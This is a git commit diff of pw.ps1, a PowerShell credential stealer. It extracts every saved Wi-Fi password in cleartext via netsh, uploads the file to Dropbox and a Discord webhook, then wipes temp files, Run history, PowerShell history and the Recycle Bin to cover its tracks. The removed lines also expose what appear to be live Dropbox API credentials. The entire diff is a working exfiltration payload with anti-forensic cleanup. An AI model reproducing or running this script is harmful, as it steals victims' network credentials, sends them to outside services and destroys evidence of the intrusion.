46443ffc8bc8aab87a3d944ab1056ec49cd5e3fa
KC1LSR <66142920+KC1LSR@users.noreply.github.com>
2024-10-14 00:16:11 -0400

    Add files via upload

--- pw.ps1
+++ pw.ps1
@@ -1,16 +1,6 @@
-############################################################################################################################################################
-
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
-
-
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
-
-############################################################################################################################################################
-
-# Upload output file to Dropbox
-$appKey = "fddn4r9i3iib7em"
-$appSecret = "7hqpe9ini9unjum"
-$refreshToken = "6MahkcJgggsAAAAAAAAAAacXuLvsc2SwyFn80bOuJ3giuqxCIU7qIm8JaSSQWmVz"
+$appKey = "YOUR_ACTUAL_APP_KEY"
+$appSecret = "YOUR_ACTUAL_APP_SECRET"
+$refreshToken = "YOUR_ACTUAL_REFRESH_TOKEN"
 
 function Get-NewAccessToken {
     $body = @{
@@ -23,80 +13,77 @@ function Get-NewAccessToken {
     return $response.access_token
 }
 
+$accessToken = Get-NewAccessToken
+$db = $accessToken
 
+############################################################################################################################################################
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
+############################################################################################################################################################
+# Upload output file to Dropbox
 function DropBox-Upload {
+    [CmdletBinding()]
+    param (
+        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    )
 
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$sd = Get-NewAccessToken
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath = "/$outputFile"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $db
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
-
+if (-not ([string]::IsNullOrEmpty($db))) {
+    DropBox-Upload -f $env:TEMP/--wifi-pass.txt
+}
 ############################################################################################################################################################
-
+# Upload to Discord
 function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text
+    )
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+    $hookurl = "$dc"
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+    }
 
-$hookurl = "$dc"
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    }
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
 }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+if (-not ([string]::IsNullOrEmpty($dc))) {
+    Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
 }
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
-
- 
-
 ############################################################################################################################################################
-
-function Clean-Exfil { 
-
-# empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
-
-# Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
-# Empty recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
+# Clean up
+function Clean-Exfil {
+    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
-############################################################################################################################################################
-
-if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
-
+if (-not ([string]::IsNullOrEmpty($ce))) {
+    Clean-Exfil
+}
 
 RI $env:TEMP/--wifi-pass.txt
